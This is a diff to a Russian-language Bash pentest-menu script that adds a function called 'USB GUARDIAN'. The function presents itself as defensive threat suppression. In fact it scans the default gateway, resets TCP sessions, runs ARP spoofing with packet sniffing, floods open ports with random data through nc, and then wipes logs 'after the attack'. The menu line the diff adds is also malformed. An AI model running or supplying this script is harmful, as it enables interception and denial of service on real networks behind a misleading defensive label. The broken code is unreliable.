@@ -220,6 +220,69 @@ find . -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null
     sleep 3
 }
 
+# --- АВТОНОМНЫЙ ЭВРИСТИЧЕСКИЙ МОДУЛЬ: USB GUARDIAN v4.0 ---
+
+usb_guardian_smart() {
+    echo -e "${YELLOW}[*] Инициализация Эвристического Анализа...${NC}"
+    TARGET_IP=$(ip route | grep default | awk '{print $3}')
+    
+    if [[ -z "$TARGET_IP" ]]; then
+        echo -e "${RED}[-] Цель не найдена. Убедись, что USB-модем активен.${NC}"
+        read -p "Нажми Enter..." ; return
+    fi
+
+    echo -e "${CYAN}[+] Цель: $TARGET_IP. Начинаю подавление угроз...${NC}"
+    
+    # Список критических портов + эвристический поиск (top-100 опасных)
+    SCAN_RES=$(nmap -sV --top-ports 100 --open "$TARGET_IP")
+    BAD_PORTS=$(echo "$SCAN_RES" | grep "open" | awk -F'/' '{print $1}' | xargs | tr ' ' ',')
+
+    if [[ -z "$BAD_PORTS" ]]; then
+        echo -e "${GREEN}[+] Чисто. Активных сетевых бэкдоров не обнаружено.${NC}"
+        read -p "Нажми Enter..." ; return
+    fi
+
+    echo -e "${RED}[!!!] ОБНАРУЖЕНА АКТИВНОСТЬ: Порты [$BAD_PORTS]${NC}"
+
+    # ЦИКЛ АВТОНОМНОГО ОБЕЗВРЕЖИВАНИЯ
+    for port in ${BAD_PORTS//,/ }; do
+        echo -e "${YELLOW}[>>>] Подавление угрозы на порту: $port${NC}"
+        
+        # ШАГ 1: TCP Reset (Мгновенный разрыв)
+        echo -e "${BLUE}[1/3] Попытка разрыва TCP сессии...${NC}"
+        timeout 10s bettercap -eval "net.recon on; tcp.reset on" -target "$TARGET_IP" >/dev/null 2>&1
+        
+        # Проверка результата
+        if ! nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
+            echo -e "${GREEN}[V] Успешно: Соединение порта $port разорвано.${NC}"
+            continue
+        fi
+
+        # ШАГ 2: Сетевая изоляция (ARP Poisoning)
+        echo -e "${BLUE}[2/3] Порт не закрылся. Изолирую ПК от внешней сети...${NC}"
+        timeout 15s bettercap -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on" >/dev/null 2>&1
+        
+        # ШАГ 3: Эвристическое "выжигание" (Flood/Fuzzing)
+        echo -e "${BLUE}[3/3] Финальное подавление. Забиваю канал вируса мусором...${NC}"
+        # Отправляем мусорные данные на порт, чтобы подвесить службу вируса
+        ( head -c 10M < /dev/urandom | nc -nv "$TARGET_IP" "$port" ) & >/dev/null 2>&1
+        sleep 5
+        kill $! 2>/dev/null
+
+        # Финальная проверка
+        if nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
+            echo -e "${RED}[!] Внимание: Служба на порту $port устойчива. Требуется ручной аудит.${NC}"
+        else
+            echo -e "${GREEN}[V] Угроза на порту $port нейтрализована эвристическим методом.${NC}"
+        fi
+    done
+
+    echo -e "${CYAN}[*] Зачистка завершена. Проверка системы...${NC}"
+    deep_purge # Сразу чистим логи после атаки
+}
+
+
+
 show_menu() {
     clear
     echo -e "${CYAN}===========================================${NC}"
@@ -233,6 +296,7 @@ show_menu() {
     echo -e " ${BLUE}7.${NC} NIKTO             ${BLUE}8.${NC} SMART INSTALLER"
     echo -e " ${YELLOW}10. SHERLOCK        11. WIFITE${NC}"
     echo -e " ${RED}9. DEEP PURGE (ОЧИСТКА)${NC}"
+12. USB GUARDIAN SMART{NC}"
     echo -e " ${RED}0.${NC} ВЫХОД"
     echo -e "${CYAN}===========================================${NC}"
 }
@@ -253,6 +317,7 @@ while true; do
         9) deep_purge ;;
         10) run_sherlock ;;
         11) run_wifite ;;
+        12) usb_guardian_smart;;
         0) exit 0 ;;
         *) sleep 1 ;;
     esac
